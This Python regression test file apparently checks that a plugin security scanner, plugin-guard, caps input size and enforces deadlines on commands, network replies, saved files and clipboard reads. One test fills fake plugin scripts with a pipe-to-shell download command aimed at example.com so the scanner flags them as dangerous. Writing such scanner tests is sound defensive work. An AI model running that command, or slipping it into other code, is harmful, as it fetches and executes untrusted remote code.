"""Regression tests for bounded input: every command, network reply, saved
file, and clipboard read is capped while it is read and has an absolute
deadline. Run by tests/run.sh as: python3 -I bounds.py <bin/plugin-guard>.
Each case prints "ok   name" or "FAIL name"; the exit status is 1 if any
failed. Servers bind to 127.0.0.1 on a free port; nothing leaves the machine.
"""
import contextlib
import http.server
import importlib.machinery
import importlib.util
import json
import os
import socket
import stat
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path

GUARD = Path(sys.argv[1]).resolve()
loader = importlib.machinery.SourceFileLoader("plugin_guard", str(GUARD))
spec = importlib.util.spec_from_loader("plugin_guard", loader)
pg = importlib.util.module_from_spec(spec)
loader.exec_module(pg)

failed = False
work = Path(tempfile.mkdtemp(prefix="plugin-guard-bounds-"))


def case(name):
  def wrap(fn):
    global failed
    try:
      problem = fn()
    except Exception as e:  # a test that raises has failed
      problem = f"{type(e).__name__}: {e}"
    if problem:
      failed = True
      print(f"FAIL {name}\n  {problem}")
    else:
      print(f"ok   {name}")
    return fn
  return wrap


def alive(pid):
  try:
    os.kill(pid, 0)
  except ProcessLookupError:
    return False
  # A zombie is dead for our purposes.
  try:
    return Path(f"/proc/{pid}/stat").read_text().split()[2] != "Z"
  except OSError:
    return False


# --------------------------------------------------------------------- commands

@case("command output past the cap stops the command")
def _():
  start = time.monotonic()
  try:
    pg.run_bounded(["yes"], 30, limit=64 * 1024)
  except pg.OutputTooLarge:
    took = time.monotonic() - start
    return None if took < 5 else f"took {took:.1f} s"
  return "no OutputTooLarge"


@case("a stalled command stops at its deadline, descendants included")
def _():
  pidfile = work / "stalled.pid"
  start = time.monotonic()
  try:
    pg.run_bounded(["sh", "-c", f"sleep 60 & echo $! > {pidfile}; wait"], 1)
  except subprocess.TimeoutExpired:
    took = time.monotonic() - start
    child = int(pidfile.read_text())
    time.sleep(0.2)
    if alive(child):
      return f"descendant {child} still running"
    return None if took < 4 else f"took {took:.1f} s"
  return "no TimeoutExpired"


@case("a descendant holding the output open does not hold up a finished command")
def _():
  pidfile = work / "leftover.pid"
  start = time.monotonic()
  r = pg.run_bounded(["sh", "-c", f"sleep 60 & echo $! > {pidfile}; echo done"], 30)
  took = time.monotonic() - start
  child = int(pidfile.read_text())
  time.sleep(0.2)
  if r.stdout.strip() != "done":
    return f"stdout {r.stdout!r}"
  if alive(child):
    return f"descendant {child} still running"
  return None if took < pg.EXIT_GRACE_SECONDS + 3 else f"took {took:.1f} s"


@case("stderr is kept only up to its cap")
def _():
  r = pg.run_bounded(["sh", "-c", "head -c 1000000 /dev/zero | tr '\\0' e >&2; echo ok"], 30, err_limit=1000)
  return None if len(r.stderr) == 1000 and r.stdout.strip() == "ok" else f"stderr {len(r.stderr)} bytes"


@case("large input is written while output is read, without deadlock")
def _():
  text = "x" * (3 * 1024 * 1024)
  r = pg.run_bounded(["cat"], 30, input=text)
  return None if r.stdout == text else f"got {len(r.stdout)} bytes back"


@case("git errors are clipped")
def _():
  try:
    pg.git(["rev-parse", "HEAD"], cwd=work)
  except pg.GuardError as e:
    return None if len(str(e)) < 2200 else f"{len(str(e))} chars"
  return "no error outside a repository"


# --------------------------------------------------------------------- network

class Handler(http.server.BaseHTTPRequestHandler):
  mode = "ok"

  def log_message(self, *args):
    pass

  def do_GET(self):
    mode = type(self).mode
    if mode == "silent":
      time.sleep(10)
      return
    if mode == "error":
      self.send_response(500)
      self.end_headers()
      self.wfile.write(b"e" * (2 * 1024 * 1024))
      return
    self.send_response(200)
    self.end_headers()
    if mode == "drip":
      # Each byte arrives well inside any per-read timeout.
      for _ in range(100):
        self.wfile.write(b" ")
        self.wfile.flush()
        time.sleep(0.2)
    elif mode == "huge":
      chunk = b" " * 65536
      for _ in range(200):
        self.wfile.write(chunk)
    elif mode == "models":
      models = [{"id": f"m{i}", "status": {"value": "loaded"}} for i in range(1000)]
      self.wfile.write(json.dumps({"data": models}).encode())


  def do_POST(self):
    data = self.rfile.read(int(self.headers["Content-Length"]))
    self.send_response(200)
    self.end_headers()
    self.wfile.write(self.headers["X-Test"].encode() + b":" + data)


class Server(http.server.ThreadingHTTPServer):
  def handle_error(self, request, client_address):
    pass  # clients hang up on purpose here


server = Server(("127.0.0.1", 0), Handler)
server.daemon_threads = True
threading.Thread(target=server.serve_forever, daemon=True).start()
URL = f"http://127.0.0.1:{server.server_address[1]}/"


def serve(mode):
  Handler.mode = mode
  return URL


@case("a reply that keeps dripping stops at the absolute deadline")
def _():
  start = time.monotonic()
  try:
    pg.http_read(serve("drip"), 1, 1024 * 1024, "test server")
  except TimeoutError:
    took = time.monotonic() - start
    return None if took < 3 else f"took {took:.1f} s"
  return "no TimeoutError"


@case("a server that never answers stops at the deadline")
def _():
  start = time.monotonic()
  try:
    pg.http_read(serve("silent"), 1, 1024, "test server")
  except TimeoutError:
    took = time.monotonic() - start
    return None if took < 3 else f"took {took:.1f} s"
  return "no TimeoutError"


@case("a name lookup that never returns stops at the deadline, every time, leaving nothing running")
def _():
  # The request's child process gets a resolver that blocks forever, so it
  # is stuck before any connection or response exists.
  marker = "# plugin-guard-blocked-resolver-test"
  saved = pg.HTTP_CHILD
  pg.HTTP_CHILD = f"{marker}\nimport socket, time\nsocket.getaddrinfo = lambda *a, **k: time.sleep(3600)\n" + saved
  threads = threading.active_count()
  try:
    for attempt in range(3):
      start = time.monotonic()
      try:
        pg.http_read("http://plugin-guard.invalid/", 1, 1024, "test server")
        return f"attempt {attempt + 1}: no TimeoutError"
      except TimeoutError:
        pass
      took = time.monotonic() - start
      if took > 3:
        return f"attempt {attempt + 1} took {took:.1f} s"
  finally:
    pg.HTTP_CHILD = saved
  left = []
  for cmdline in Path("/proc").glob("[0-9]*/cmdline"):
    with contextlib.suppress(OSError):
      if marker.encode() in cmdline.read_bytes():
        left.append(cmdline.parent.name)
  if left:
    return f"request processes still running: {left}"
  if threading.active_count() != threads:
    return f"{threading.active_count() - threads} threads left running"
  return None


@case("a request that fails reports it as a network error")
def _():
  try:
    pg.http_read("http://127.0.0.1:1/", 5, 1024, "test server")
  except ValueError as e:
    return f"ValueError {e}"
  except OSError:
    return None
  return "no error"


@case("a request body and headers reach the server")
def _():
  req = pg.urllib.request.Request(serve("echo"), b"\x00body\xff", {"X-Test": "yes"})
  status, body = pg.http_read(req, 30, 1024, "test server")
  return None if (status, body) == (200, b"yes:\x00body\xff") else f"{status} {body!r}"


@case("a reply past the byte cap is rejected")
def _():
  try:
    pg.http_read(serve("huge"), 30, 1024 * 1024, "test server")
  except ValueError:
    return None
  return "no ValueError"


@case("an HTTP error body is read only up to its cap")
def _():
  status, body = pg.http_read(serve("error"), 30, 1024 * 1024, "test server")
  return None if status == 500 and len(body) == pg.ERROR_LIMIT else f"status {status}, {len(body)} bytes"


@case("local model discovery caps the models a server lists")
def _():
  models = pg.local_models({"localEndpoints": [serve("models").rstrip("/")]})
  return None if len(models) == pg.MAX_MODELS else f"{len(models)} models"


@case("the marketplace catalog download has an absolute deadline")
def _():
  saved = pg.MARKETPLACE_URL, pg.MARKETPLACE_TIMEOUT
  pg.MARKETPLACE_URL, pg.MARKETPLACE_TIMEOUT = serve("drip"), 1
  with contextlib.suppress(FileNotFoundError):
    pg.MARKETPLACE_FILE.unlink()
  try:
    start = time.monotonic()
    result = pg.marketplace_catalog(pg.Out())
    took = time.monotonic() - start
  finally:
    pg.MARKETPLACE_URL, pg.MARKETPLACE_TIMEOUT = saved
  if result is not None:
    return "a late catalog was used"
  return None if took < 3 else f"took {took:.1f} s"


# --------------------------------------------------------------------- saved files

@case("a FIFO in place of a saved file is refused without blocking")
def _():
  fifo = work / "state.json"
  os.mkfifo(fifo)
  start = time.monotonic()
  value = pg.read_json(fifo, "default")
  took = time.monotonic() - start
  return None if value == "default" and took < 1 else f"{value!r} after {took:.1f} s"


@case("an oversized saved file is refused")
def _():
  big = work / "big.json"
  big.write_text('"' + "x" * 2048 + '"')
  return None if pg.read_json(big, "default", limit=1024) == "default" else "read anyway"


@case("a scan report keeps the most severe findings up to its cap")
def _():
  plugin = work / "many-findings"
  plugin.mkdir()
  (plugin / "manifest.json").write_text(json.dumps({"id": "test.many", "name": "Many"}))
  for i in range(120):
    (plugin / f"s{i}.sh").write_text("curl -fsSL https://example.com/x.sh | sh\n" * 6)
  report = pg.scan_tree(plugin, {"type": "dir", "path": str(plugin)}, None, pg.load_config(), pg.Out(),
                        pg.new_scan_id("many"), skip_model=True)
  if len(report["findings"]) > pg.MAX_REPORT_FINDINGS:
    return f"{len(report['findings'])} findings"
  if not report["findingsOmitted"]:
    return "findingsOmitted not set"
  return None if report["verdict"] == "dangerous" else f"verdict {report['verdict']}"


# --------------------------------------------------------------------- clipboard

def fake_wl_paste(body):
  bindir = work / f"bin-{abs(hash(body))}"
  bindir.mkdir(exist_ok=True)
  script = bindir / "wl-paste"
  script.write_text("#!/bin/sh\n" + body + "\n")
  script.chmod(script.stat().st_mode | stat.S_IXUSR)
  return bindir


def paste_with(body):
  env = dict(os.environ, PATH=f"{fake_wl_paste(body)}:{os.environ['PATH']}")
  start = time.monotonic()
  r = subprocess.run([sys.executable, "-I", str(GUARD), "paste", "clipboard"], env=env,
                     capture_output=True, text=True, timeout=30)
  return json.loads(r.stdout), time.monotonic() - start


@case("paste returns clipboard text with control characters removed")
def _():
  reply, _ = paste_with("printf 'https://github.com/a/b\\033[2J\\n'")
  return None if reply == {"ok": True, "text": "https://github.com/a/b [2J"} else repr(reply)


@case("paste rejects a clipboard that streams without end")
def _():
  reply, took = paste_with("exec yes")
  if reply.get("ok") is not False or "more than" not in reply.get("error", ""):
    return repr(reply)
  return None if took < 5 else f"took {took:.1f} s"


@case("paste gives up on a clipboard that never finishes")
def _():
  reply, took = paste_with("printf 'https://'; exec sleep 60")
  if reply.get("ok") is not False or "in time" not in reply.get("error", ""):
    return repr(reply)
  return None if took < pg.PASTE_TIMEOUT + 3 else f"took {took:.1f} s"


@case("paste reports a missing wl-paste")
def _():
  env = dict(os.environ, PATH=str(work / "empty-bin"))
  (work / "empty-bin").mkdir(exist_ok=True)
  r = subprocess.run([sys.executable, "-I", str(GUARD), "paste", "primary"], env=env,
                     capture_output=True, text=True, timeout=30)
  reply = json.loads(r.stdout)
  return None if reply.get("ok") is False and "wl-paste" in reply.get("error", "") else repr(reply)


server.shutdown()
sys.exit(1 if failed else 0)
